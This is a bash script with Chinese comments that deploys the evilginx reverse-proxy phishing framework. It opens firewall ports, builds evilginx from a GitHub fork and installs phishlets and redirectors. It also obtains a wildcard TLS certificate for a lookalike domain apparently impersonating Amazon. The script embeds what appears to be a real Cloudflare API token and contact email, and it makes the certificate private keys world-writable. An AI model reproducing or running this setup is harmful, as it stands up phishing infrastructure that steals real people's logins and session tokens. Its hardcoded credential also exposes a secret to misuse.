#!/bin/bash

# 配置 email 变量，用于接收 Let's Encrypt 证书相关通知的电子邮件地址。
email="dadanew07559@proton.me"
# 配置 domain 变量，这是要获取通配符证书的主域名。
domain="amazon.adownoe.online"
# 配置 cloudflare_api_token 变量，这是你的 cloudflare API 令牌，用于 certbot 与 cloudflare API 交互。
cloudflare_api_token="UchG6N78CdmVOHsIimLcIEshnRCqRCJdi5p4Jg6b"
cloudflare_ini="/tmp/crt/cloudflare.ini"
cert_base_dir="/etc/letsencrypt/live"
go_version="1.22.3"
go_url="https://go.dev/dl/go${go_version}.linux-amd64.tar.gz"
evilginx_path="/root/evilginx"

echo "打开防火墙相应入站端口..."
ufw enable
ufw allow 22/tcp
ufw allow 443/tcp
ufw allow 53/udp
ufw reload
echo "防火墙入站端口 22 443 53 均已打开..."

echo "安装 python3-certbot-dns-cloudflare 以自动化申请通配符证书..."
apt install -y python3-certbot-dns-cloudflare

if systemctl list-unit-files | grep -q "^systemd-resolved.service"; then
    echo "systemd-resolved 存在，正在关闭它以解决 53 端口冲突..."
    sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
    systemctl restart systemd-resolved
else
    echo "systemd-resolved 不存在，跳过 53 端口冲突解决步骤..."
fi

echo "安装 golang..."
curl -OL ${go_url}
tar -C /usr/local -xzf go${go_version}.linux-amd64.tar.gz
rm go${go_version}.linux-amd64.tar.gz
echo "设置 golang 环境变量..."
if ! grep -q 'export PATH=$PATH:/usr/local/go/bin' /home/ubuntu/.profile ; then
    echo "export PATH=\$PATH:/usr/local/go/bin" >> /home/ubuntu/.profile
    echo "export GOPATH=\$HOME/go" >> /home/ubuntu/.profile
    echo "export PATH=\$PATH:\$GOPATH/bin" >> /home/ubuntu/.profile
fi
echo "临时刷新环境变量，使其在当前脚本中生效..."
export PATH=$PATH:/usr/local/go/bin
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin
export PATH=$PATH:${evilginx_path}

echo "克隆 evilginx..."
git clone https://github.com/shandelu999/evilginx /tmp/evilginx/

echo "创建 evilginx 二进制文件..."
cd /tmp/evilginx/
go build
make

echo "建立 phishlets 和 redirectors 目录..."
mkdir -p /root/evilginx
cp /tmp/evilginx/build/evilginx /root/evilginx/
cd /root/evilginx/
mkdir -p phishlets redirectors

echo "设置 evilginx 环境变量..."
export PATH=$PATH:/root/evilginx
echo 'export PATH=$PATH:/root/evilginx' >> /root/.bashrc
source /root/.bashrc

echo "设置权限以允许 evilginx 使用低级端口..."
setcap CAP_NET_BIND_SERVICE=+eip evilginx

echo "移动 phishlet.yaml、redirectors 到建立的目录"
mv /tmp/data/phishlets/* /root/evilginx/phishlets/
mv /tmp/data/redirectors/* /root/evilginx/redirectors/

echo "evilginx 部署完成..."

echo "创建 cloudflare API 凭证的配置文件..."
mkdir -p $(dirname ${cloudflare_ini})
bash -c "cat > ${cloudflare_ini} <<EOF
dns_cloudflare_api_token = ${cloudflare_api_token}
EOF"
echo "如果不存在该目录，则创建存储证书的目录..."
if [ ! -d "/root/.evilginx/crt/sites/${domain}" ]; then
  mkdir -p /root/.evilginx/crt/sites/${domain}
fi
echo "获取通配符证书..."
certbot certonly \
  --dns-cloudflare \
  --dns-cloudflare-credentials ${cloudflare_ini} \
  -d ${domain} \
  -d *.${domain} \
  --email ${email} \
  --agree-tos \
  --non-interactive \
  --rsa-key-size 2048 \
  --no-eff-email
cert_dir=$(sudo ls -d ${cert_base_dir}/${domain}* | tail -n 1)
if [ -f ${cert_dir}/privkey.pem ]; then
    echo "设置证书和私钥的权限以进行复制和移动..."
    chmod 777 ${cert_dir}/privkey.pem
    chmod 777 ${cert_dir}/fullchain.pem
    echo "复制证书和私钥到 evilginx 证书目录..."
    cp ${cert_dir}/fullchain.pem /root/.evilginx/crt/sites/${domain}/fullchain.pem
    cp ${cert_dir}/privkey.pem /root/.evilginx/crt/sites/${domain}/privkey.pem
else
    echo "证书生成失败，${cert_dir}/privkey.pem 不存在!!!"
fi
echo "通配符证书申请及配置完成..."

echo "evilginx 即将全面就位，运行一次 evilginx 以生成相应目录，并移动 config.json 和 blacklist.txt 到相应目录..."

exit 0